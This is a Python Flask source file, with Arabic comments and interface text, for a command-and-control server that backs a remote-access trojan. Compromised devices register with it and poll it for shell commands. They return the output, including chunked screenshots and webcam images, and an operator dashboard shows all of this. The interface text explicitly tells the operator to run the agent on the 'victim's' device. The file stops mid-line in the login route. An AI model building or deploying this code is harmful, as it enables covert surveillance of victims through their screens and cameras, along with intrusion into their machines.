# ============================================================
# C2 Server v3.1 - Image Chunk Assembly
# ============================================================

import os
import json
import uuid
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect, session, Response

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()
app.url_map.strict_slashes = False

# ============================================================
# الإعدادات
# ============================================================
DATA_FILE = '/tmp/c2_data.json'
COMMANDS_FILE = '/tmp/c2_commands.json'
RESULTS_FILE = '/tmp/c2_results.json'
SCREENSHOTS_DIR = '/tmp/screenshots'

os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

ADMIN_PASSWORD = "changeme123"   # ← غيرها

# تخزين مؤقت لأجزاء الصور
IMAGE_CHUNKS = {}


# ============================================================
# دوال التخزين
# ============================================================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return default


def save_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False


def get_devices(): return load_json(DATA_FILE, {})
def get_commands(): return load_json(COMMANDS_FILE, {})
def get_results(): return load_json(RESULTS_FILE, {})


def add_command(device_id, command_text):
    commands = get_commands()
    if device_id not in commands:
        commands[device_id] = []
    cmd_id = str(uuid.uuid4())[:8]
    commands[device_id].append({
        "id": cmd_id,
        "command": command_text,
        "created_at": datetime.now().isoformat(),
        "executed": False
    })
    save_json(COMMANDS_FILE, commands)
    return cmd_id


def save_result(device_id, command_id, output):
    """حفظ النتيجة في السجل"""
    results = get_results()
    if device_id not in results:
        results[device_id] = []
    results[device_id].append({
        "command_id": command_id,
        "output": output,
        "timestamp": datetime.now().isoformat()
    })
    results[device_id] = results[device_id][-200:]
    save_json(RESULTS_FILE, results)


# ============================================================
# API
# ============================================================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "no device_id"}), 400
    
    devices = get_devices()
    devices[device_id] = {
        "device_id": device_id,
        "hostname": data.get('hostname', 'unknown'),
        "username": data.get('username', 'unknown'),
        "os": data.get('os', 'unknown'),
        "os_version": data.get('os_version', 'unknown'),
        "ip": request.remote_addr,
        "admin": data.get('admin', False),
        "first_seen": devices.get(device_id, {}).get('first_seen', datetime.now().isoformat()),
        "last_seen": datetime.now().isoformat(),
        "online": True
    }
    save_json(DATA_FILE, devices)
    return jsonify({"status": "ok"}), 200


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "no id"}), 400
    
    devices = get_devices()
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
        save_json(DATA_FILE, devices)
    
    commands = get_commands()
    pending = [c for c in commands.get(device_id, []) if not c.get('executed', False)]
    return jsonify({"status": "ok", "commands": pending}), 200


@app.route('/api/result', methods=['POST'])
def result():
    data = request.get_json()
    device_id = data.get('device_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    
    if not device_id or not command_id:
        return jsonify({"error": "missing"}), 400
    
    # تحديث حالة الأمر
    commands = get_commands()
    if device_id in commands:
        for cmd in commands[device_id]:
            if cmd['id'] == command_id:
                cmd['executed'] = True
                cmd['executed_at'] = datetime.now().isoformat()
        save_json(COMMANDS_FILE, commands)
    
    # ========================================================
    # التعامل مع أجزاء الصور
    # ========================================================
    for prefix, img_type, ext in [
        ('SCREENSHOT:PART:', 'screen', 'png'),
        ('WEBCAM:PART:', 'webcam', 'jpg')
    ]:
        if output.startswith(prefix):
            rest = output.replace(prefix, '')
            # rest = "0:3:xxxxx"
            parts = rest.split(':', 2)
            
            if len(parts) != 3:
                return jsonify({"error": "bad chunk format"}), 400
            
            part_num = int(parts[0])
            total_parts = int(parts[1])
            chunk_data = parts[2]
            
            # تخزين الجزء
            if device_id not in IMAGE_CHUNKS:
                IMAGE_CHUNKS[device_id] = {}
            if command_id not in IMAGE_CHUNKS[device_id]:
                IMAGE_CHUNKS[device_id][command_id] = {
                    "parts": {},
                    "total": total_parts,
                    "type": img_type,
                    "ext": ext
                }
            
            IMAGE_CHUNKS[device_id][command_id]["parts"][part_num] = chunk_data
            
            # إذا وصلت كل الأجزاء
            if len(IMAGE_CHUNKS[device_id][command_id]["parts"]) == total_parts:
                full_data = ""
                for i in range(total_parts):
                    full_data += IMAGE_CHUNKS[device_id][command_id]["parts"].get(i, "")
                
                try:
                    # إضافة padding إذا لزم
                    missing_padding = len(full_data) % 4
                    if missing_padding:
                        full_data += '=' * (4 - missing_padding)
                    
                    img_bytes = base64.b64decode(full_data)
                    
                    img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_{img_type}.{ext}")
                    with open(img_path, 'wb') as f:
                        f.write(img_bytes)
                    
                    final_output = f"[+] {img_type.capitalize()} saved ({len(img_bytes)} bytes, {total_parts} parts)"
                except Exception as e:
                    final_output = f"[-] {img_type} decode error: {e}"
                
                # حذف الأجزاء المؤقتة
                del IMAGE_CHUNKS[device_id][command_id]
                
                save_result(device_id, command_id, final_output)
            
            return jsonify({"status": "ok", "part": part_num}), 200
    
    # ========================================================
    # الصور الصغيرة (بدون تقسيم)
    # ========================================================
    if output.startswith('SCREENSHOT:'):
        img_data = output.replace('SCREENSHOT:', '')
        try:
            missing_padding = len(img_data) % 4
            if missing_padding:
                img_data += '=' * (4 - missing_padding)
            img_bytes = base64.b64decode(img_data)
            img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_screen.png")
            with open(img_path, 'wb') as f:
                f.write(img_bytes)
            output = f"[+] Screenshot saved ({len(img_bytes)} bytes)"
        except Exception as e:
            output = f"[-] Screenshot save error: {e}"
    
    elif output.startswith('WEBCAM:'):
        img_data = output.replace('WEBCAM:', '')
        try:
            missing_padding = len(img_data) % 4
            if missing_padding:
                img_data += '=' * (4 - missing_padding)
            img_bytes = base64.b64decode(img_data)
            img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_webcam.jpg")
            with open(img_path, 'wb') as f:
                f.write(img_bytes)
            output = f"[+] Webcam saved ({len(img_bytes)} bytes)"
        except Exception as e:
            output = f"[-] Webcam save error: {e}"
    
    # حفظ النتيجة
    save_result(device_id, command_id, output)
    
    return jsonify({"status": "ok"}), 200


# ============================================================
# عرض الصور
# ============================================================
@app.route('/image/<device_id>')
def show_image(device_id):
    if not session.get('logged_in'):
        return "Unauthorized", 401
    img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_screen.png")
    if not os.path.exists(img_path):
        return "No image", 404
    with open(img_path, 'rb') as f:
        img_bytes = f.read()
    return Response(
        img_bytes, mimetype='image/png',
        headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
                 'Pragma': 'no-cache', 'Expires': '0'}
    )


@app.route('/image/<device_id>/webcam')
def show_webcam(device_id):
    if not session.get('logged_in'):
        return "Unauthorized", 401
    img_path = os.path.join(SCREENSHOTS_DIR, f"{device_id}_webcam.jpg")
    if not os.path.exists(img_path):
        return "No image", 404
    with open(img_path, 'rb') as f:
        img_bytes = f.read()
    return Response(
        img_bytes, mimetype='image/jpeg',
        headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
                 'Pragma': 'no-cache', 'Expires': '0'}
    )


# ============================================================
# قوالب HTML
# ============================================================
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>C2 Login</title>
    <style>
        body { font-family: Arial; background: #0a0a0a; color: #eee; 
               display: flex; justify-content: center; align-items: center; 
               height: 100vh; margin: 0; }
        .box { background: #1a1a2e; padding: 40px; border-radius: 10px; 
               border: 1px solid #e94560; width: 300px; }
        h1 { color: #e94560; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; 
                border: 1px solid #333; background: #0f0f1e; color: #eee; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #e94560; color: white; 
                 border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .error { color: #ff4444; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🔒 C2 Panel</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial; background: #0a0a0a; color: #eee; margin: 0; padding: 20px; }
        h1 { color: #e94560; margin: 0; }
        h2, h3 { color: #f9a826; }
        .header { display: flex; justify-content: space-between; align-items: center; 
                  border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
        .logout { color: #e94560; text-decoration: none; padding: 8px 15px; 
                  border: 1px solid #e94560; border-radius: 5px; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat { background: #1a1a2e; padding: 15px; border-radius: 8px; border-right: 4px solid #e94560; }
        .stat .num { font-size: 28px; color: #e94560; font-weight: bold; }
        .stat .label { color: #999; font-size: 13px; margin-top: 5px; }
        .device { background: #16213e; padding: 15px; border-radius: 8px; margin-bottom: 10px; 
                  border-right: 4px solid #0f0; cursor: pointer; transition: 0.2s; }
        .device.offline { border-right-color: #666; opacity: 0.6; }
        .device:hover { background: #1e2a4a; }
        .device .hostname { font-weight: bold; font-size: 16px; }
        .device .info { color: #999; font-size: 13px; margin-top: 5px; }
        .layout { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 1000px) { .layout { grid-template-columns: 1fr; } }
        .panel { background: #1a1a2e; padding: 20px; border-radius: 8px; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; 
                    font-family: 'Consolas', monospace; color: #0f0; 
                    max-height: 400px; overflow-y: auto; margin-top: 15px; font-size: 13px; }
        .term-input { display: flex; gap: 10px; margin-top: 15px; }
        .term-input input { flex: 1; padding: 12px; background: #000; color: #0f0; 
                            border: 1px solid #0f0; border-radius: 5px; 
                            font-family: monospace; font-size: 14px; }
        .term-input button { padding: 12px 25px; background: #0f0; color: #000; 
                             border: none; border-radius: 5px; cursor: pointer; 
                             font-weight: bold; font-size: 14px; }
        .quick-actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px; }
        .quick-actions button { padding: 10px; background: #0f3460; color: #eee; 
                                border: 1px solid #1e5a9c; border-radius: 5px; 
                                cursor: pointer; font-size: 13px; transition: 0.2s; }
        .quick-actions button:hover { background: #1e5a9c; }
        .screenshot-box { background: #000; padding: 10px; border-radius: 5px; 
                          text-align: center; margin-top: 15px; min-height: 200px;
                          display: flex; align-items: center; justify-content: center; }
        .screenshot-box img { max-width: 100%; border-radius: 5px; border: 1px solid #333; }
        .result-line { padding: 5px 0; border-bottom: 1px solid #1a1a1a; }
        .result-time { color: #f9a826; font-size: 11px; }
        .back { color: #e94560; text-decoration: none; display: inline-block; margin-bottom: 15px; }
        .refresh { background: #0f3460; color: white; padding: 8px 15px; text-decoration: none; 
                   border-radius: 5px; display: inline-block; margin-bottom: 15px; }
        .info-row { background: #0f3460; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
        .status-online { color: #0f0; }
        .status-offline { color: #666; }
        pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 C2 Control Panel</h1>
        <a href="/logout" class="logout">Logout</a>
    </div>
    
    <div class="stats">
        <div class="stat">
            <div class="num">{{ total }}</div>
            <div class="label">Total Devices</div>
        </div>
        <div class="stat">
            <div class="num">{{ online }}</div>
            <div class="label">Online Now</div>
        </div>
        <div class="stat">
            <div class="num">{{ commands_count }}</div>
            <div class="label">Commands Sent</div>
        </div>
        <div class="stat">
            <div class="num">{{ images_count }}</div>
            <div class="label">Images Stored</div>
        </div>
    </div>
    
    {% if not selected %}
    
    <h2>📱 الأجهزة المتصلة</h2>
    <a href="/dashboard" class="refresh">🔄 تحديث</a>
    
    {% if devices %}
        {% for device_id, info in devices.items() %}
        <div class="device {% if not info.online %}offline{% endif %}" 
             onclick="window.location='/dashboard?device={{ device_id }}'">
            <div class="hostname">
                {% if info.online %}🟢{% else %}⚫{% endif %}
                {{ info.hostname }} ({{ info.username }})
            </div>
            <div class="info">
                💻 {{ info.os }} {{ info.os_version }} | 
                🌐 {{ info.ip }} | 
                {% if info.admin %}👑 Admin{% else %}👤 User{% endif %}
            </div>
            <div class="info" style="color:#f9a826; font-size:12px;">
                ⏰ آخر ظهور: {{ info.last_seen }}
            </div>
        </div>
        {% endfor %}
    {% else %}
        <p style="color:#999; text-align:center; padding:50px;">
            لا توجد أجهزة متصلة بعد. شغّل العميل (agent.py) على جهاز الضحية.
        </p>
    {% endif %}
    
    {% else %}
    
    <a href="/dashboard" class="back">← رجوع للقائمة</a>
    
    <h2>
        🖥️ {{ selected.hostname }}
        <span class="{% if selected.online %}status-online{% else %}status-offline{% endif %}">
            ({% if selected.online %}متصل{% else %}غير متصل{% endif %})
        </span>
    </h2>
    
    <div class="info-row">
        👤 <b>{{ selected.username }}</b> | 
        💻 {{ selected.os }} {{ selected.os_version }} | 
        🌐 {{ selected.ip }} | 
        {% if selected.admin %}👑 Admin{% else %}👤 User{% endif %}
        <br>⏰ آخر ظهور: {{ selected.last_seen }}
    </div>
    
    <div class="layout">
        <div class="panel">
            <h3>💻 Terminal</h3>
            
            <form method="POST" action="/dashboard">
                <input type="hidden" name="device_id" value="{{ device_id }}">
                <div class="term-input">
                    <input type="text" name="command" placeholder="اكتب أمر..." 
                           required autofocus autocomplete="off">
                    <button type="submit">تنفيذ</button>
                </div>
            </form>
            
            <div class="quick-actions">
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="sysinfo">
                    <button type="submit" style="width:100%;">📊 SysInfo</button>
                </form>
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="whoami">
                    <button type="submit" style="width:100%;">👤 Whoami</button>
                </form>
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="dir">
                    <button type="submit" style="width:100%;">📁 Dir</button>
                </form>
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="ipconfig">
                    <button type="submit" style="width:100%;">🌐 IP</button>
                </form>
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="screenshot">
                    <button type="submit" style="width:100%; background:#e94560;">📸 شاشة</button>
                </form>
                <form method="POST" action="/dashboard" style="margin:0;">
                    <input type="hidden" name="device_id" value="{{ device_id }}">
                    <input type="hidden" name="command" value="webcam">
                    <button type="submit" style="width:100%; background:#e94560;">📷 كاميرا</button>
                </form>
            </div>
            
            <h3 style="margin-top:25px;">📜 سجل الأوامر</h3>
            <div class="terminal">
                {% if results %}
                    {% for r in results %}
                    <div class="result-line">
                        <div class="result-time">{{ r.timestamp }}</div>
                        <pre>{{ r.output }}</pre>
                    </div>
                    {% endfor %}
                {% else %}
                    <div style="color:#666;">لا توجد نتائج بعد...</div>
                {% endif %}
            </div>
        </div>
        
        <div class="panel">
            <h3>📸 شاشة الجهاز 
                <a href="/dashboard?device={{ device_id }}&t={{ timestamp }}" 
                   style="float:left; font-size:12px; color:#0f0;">🔄 تحديث</a>
            </h3>
            <div class="screenshot-box">
                <img src="/image/{{ device_id }}?t={{ timestamp }}" 
                     alt="Screenshot"
                     onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div style="display:none; color:#666; padding:20px;">
                    لا توجد صورة بعد. اضغط "📸 شاشة" لالتقاطها.
                </div>
            </div>
            
            <h3 style="margin-top:25px;">📷 الكاميرا</h3>
            <div class="screenshot-box">
                <img src="/image/{{ device_id }}/webcam?t={{ timestamp }}" 
                     alt="Webcam"
                     onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div style="display:none; color:#666; padding:20px;">
                    لا توجد صورة بعد. اضغط "📷 كاميرا" لالتقاطها.
                </div>
            </div>
            
            <h3 style="margin-top:25px;">🔄 تحديث تلقائي</h3>
            <p style="color:#999; font-size:13px;">
                الصفحة تُحدَّث تلقائياً كل 10 ثوانٍ.
            </p>
        </div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.reload();
        }, 10000);
    </script>
    
    {% endif %}
</body>
</html>
"""


# ============================================================
# المسارات
# ============================================================
@app.route('/')
def index():
    return redirect('/dashboard')


@app.route('/login', methods=['GET', 'POST'])
def login():
    error =
